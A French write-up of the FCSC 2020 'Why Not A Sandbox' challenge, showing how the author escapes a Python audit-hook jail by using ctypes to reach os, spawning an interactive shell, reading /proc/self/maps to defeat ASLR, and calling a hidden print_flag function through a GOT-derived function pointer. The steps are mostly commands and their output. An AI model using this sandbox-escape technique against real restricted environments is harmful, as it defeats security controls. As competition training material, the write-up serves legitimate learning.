<center><h1>FCSC 2020 - Why Not A Sandbox Writeup</h1></center>

<br>
<br>
<img src="https://img.onii.wtf/i/82w2m.png">


Très bien commençons par nous connecter au challenge

```
mizaru@DESKTOP-23T8VRF:~/sqlmap-dev/data/xml$ nc challenges1.france-cybersecurity-challenge.fr 4005                                                                     
Arriverez-vous à appeler la fonction print_flag
?                                                                                                                       
Python 3.8.3rc1 (default, Apr 30 2020,07:33:30)                                                                                                                         
[GCC 9.3.0] on linux
>>>  
```

Notre but est donc d'appeler la fonction print_flag, commençons

<br>
Essayons dans un premier temps d'importer le module os et pop un shell

```
>>> import os                                                                                                                                                        
Exception ignored in audit hook:                                                                                                                                        Exception: Action interdite                                                                                                                                       
Exception: Module non autorisé                                                                                                                                        Traceback (most recent call last
:                                                                                                                                        
File "<stdin>", line 1, in <module>                                                                                                                                   Exception: Action interdite 
```

Le module OS est donc interdit, essayons donc d'importer ctypes

```
>>> import ctypes                                                                                                                                          
>>>             
```

Comme nous le voyons, ctypes est autorisé. Essayons donc de pop un shell via ctypes (à savoir que ctypes embarque os avec lui)
```
>>> 
ctypes_os                                                                                                                                       
<module 'os' from '/usr/lib/python3.8/os.py'>
```

Utilisons donc execl pour pop notre shell:

```
>>> ctypes._os.execl("/bin/sh", "-i")                                                                                                                                   
-i: 0: can't access tty; job control turned off                                                                                                              
$ ls                                                                                                                          
lib_flag.so  spython
```

Nous avons pop notre shell, essayons d'importer lib_flag.so dans notre jail :)

```
>>> ctypes.cdll.LoadLibrary("lib_flag.so")                                                                                                                              
Exception: Nom de fichier interdit 
```

Très bien, au moins on est fixé sur ça, plus qu'a trouver comment appeler print_flag sans importer lib_flag.so !

Il nous faudrait donc le moyen de reconstituer l'adresse de print_flag, commençons par trouver l'adresse base de notre binaire spython
Essayons donc d'afficher le contenu de /proc/self/maps depuis notre jail.

```
>>> ctypes.__loader__.get_data("/proc/self/maps")                                                                                                                       
b'55c6a03cf000-55c6a03d0000 r--p 00000000 09:03 16782959
```

Voici donc notre adresse base, à noté que l'ASLR est activée donc qu'à chaque runtime, l'adresse base changera donc il faudra la récupérer.
<br><br>
Très bien récupérons maintenant l'offset de la fonction welcome dans la GOT
<br>
Pour la trouver, j'ai cloné le binaire sur mon ordinateur

<br>

Les premières informations que nous pouvons trouver sur le binaire est le fait que le binaire est strippé (donc qu'il ne contient pas de symboles)
```
mizaru@DESKTOP-23T8VRF:~/pyjail$ file application.bin                                                                                                                   
application.bin: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, BuildID[sha1]=c08a5d78169fa47ba5dd1bb38a212aa7b7258212, for GNU/Linux 3.2.0, stripped
```

<br>

Très bien, commençons, essayons de lancer notre binaire
```
mizaru@DESKTOP-23T8VRF:~/pyjail$ ./application.bin                                                                                                                      
./application.bin: error while loading shared libraries: libpython3.8.so.1.0: cannot open shared object file: No such file or directory 
```

<br>
Evidemment x), nous n'avons pas les libraires nécessaires, très bien essayons de récupérer la GOT de notre binaire !
Un petit coup d'`objdump -R application.bin` et le tour est joué !

```
00000000000040A8 R_X86_64_JUMP_SLOT  welcome
```

Donc l'offset de la fonction de welcome est 0x40A8, essayons maintenant de l'ajouter à notre adresse base, pour cela il va falloir repartir sur notre jail et re-récupérer l'adresse base de notre binaire.

Donc, 0x557c01692000 + 0x40A8 = 0x557c016960A8

Créons un pointeur ! 

```
>>> welcome = 0x557c016960A8                                                                                                                                            >>> ptr = ctypes.POINTER(ctypes.c_int64)                                                                                                                                
>>> cast = ctypes.cast(welcome, ptr)                                                                                                                                    
>>> cast.contents                                                                                                                                                       
c_long(139694730159552)                                                                                                                                                
>>> hex(139694730159552)                                                                                                                                                '0x7f0d36c4a5c0'
```

Plus qu'à guess l'adresse de print_flag, je vous épargne :
print_flag = `0x7f0d36c4a529`

Plus qu'à call !

```
>>> calltype = ctypes.CFUNCTYPE(ctypes.c_void_p)                                                                                                                        
>>> call = calltype(0x7f46b046b129)                                                                                                                                     >>> call()                                                                                                                                                              
super flag: FCSC{55660e5c9e048d988917e2922eb1130063ebc1030db025a81fd04bda75bab1c3}                                                                                      timeout: the monitored command dumped core 
```

Entre temps les adresses ont changées, j'ai du redémarrer la jail suite à un timeout. Merci à Sheidan d'avoir proposé ce chall très (chiant) intéressant !
